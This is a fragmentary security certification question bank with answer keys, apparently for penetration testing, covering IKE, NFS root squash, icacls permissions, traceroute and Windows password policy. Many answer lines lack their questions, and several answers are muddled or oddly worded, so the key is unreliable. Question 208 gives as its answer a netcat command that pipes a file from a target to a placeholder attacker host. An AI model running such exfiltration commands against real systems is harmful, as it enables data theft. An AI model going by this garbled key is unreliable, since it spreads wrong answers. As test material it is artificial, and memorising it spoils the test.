Because IKE Main Mode does not support the pre-shared key authentication method.
Because remote access clients always use aggressive mode for IKE Phase-1.

incorrect: Attackers could exploit the vulnerability to access any file on the FTP server.

Attackers could exploit the vulnerability to gain administrative access to the FTP server.

27.question: What does the "Root Squash" option on an NFS export do?
27.answer: Makes the root user on the NFS client access files as nobody on the server.
incorrect: Makes all users on the NFS client access files as root on the server.

incorrect: By sniffing the packets travelling between the browser and the web server.
The results are encoded in the HTTP headers returned by the server.

By observing the HTTP response code sent by the server.

A material misstatement relating to an assertion.

197.question:
Which answer is true according to icacls output?

NTSERVICE\TrustedInstaller:(F)
NTSERVICE\TrustedInstaller:(CI)(IO)(F)
NTAUTHORITY\SYSTEM:(M)
NTAUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
BUILTIN\Administrators:(M)
BUILTIN\Administrators:(OI)(CI)(IO)(F)
BUILTIN\Users:(RX)
BUILTIN\Users:(OI)(CI)(IO)(GR,GE)
CREATOROWNER:(OI)(CI)(IO)(F)
APPLICATIONPACKAGEAUTHORITY\ALLAPPLICATIONPACKAGES:(RX)
APPLICATIONPACKAGEAUTHORITY\ALLAPPLICATIONPACKAGES:(OI)(CI)(IO)(GR,GE)
APPLICATIONPACKAGEAUTHORITY\ALLRESTRICTEDAPPLICATIONPACKAGES:(RX)
APPLICATIONPACKAGEAUTHORITY\ALLRESTRICTEDAPPLICATIONPACKAGES:(OI)(CI)(IO)(GR,GE)"
197.answer: The service inhabitant of all "Trustedinstaller" has all privileges.
incorrect: The service "ALL APPLICATION PACKAGES" can delete all files.
The user "ALL APPLICATION PACKAGES" has read-only permissions.
The User "NTAUTHORITY\SYSTEM" has permissions to all files.

Encrypt only the CVV on the card.

incorrect: There will be a problem if the form is not sent "multipart/form-data".

incorrect: The exclusion list is accessible for the sa admin.

206.question: In the last transaction by tracroute, the containing TTL answers ICMP Time Exceeded. What answer is true?
206.answer: The Router decrements TTL values of packets by one when routing and discard packets whose TTL value has reached zero.
incorrect: The Server sends an ICMP Time Exceeded message back to the source
The Server sends an ICMP Host Unreachable back to the source.
The Router sends an ICMP Host Unreachable back to the source.
The Client sends an ICMP Time Exceeded message back to the source.

208.question: in a pentest a file should be transfered from a server. The firewall allows all outgoing connection. How would the file be exfiltrated?
208.answer: On your host run "nc -l 80 > out.txt", and on the target run "type file.txt | nc <yourhost> 80"
incorrect: On your host run "type file.txt | nc -l 80", and on the target run "nc -l 80"
On your host run "nc -l 80 > out.txt", and on the target run "nc -r file.txt <yourhost> 80"
On your host run "nc <target> 80 > out.txt", and on the target run "nc -p file.txt -v 80"
On your host run "nc -r 80 > out.txt", and on the target run "more file.txt | nc -h <yourhost> -p 80"

224.question:
On Windows 2008 in Active Directory a new Password-Policy was introduced. Which of the following answers is true ? 

A) Uppercase for A to Z
B) Lowercase for a to z
C) Numeric value from 0 to 9
D) Nonalphanumeric symbols such as "!", "#", "%", or "&"
224.answer: 3 out of 4 need to be set.
incorrect: A and B need to be set.
A and C need o be set
A and D need to be set.
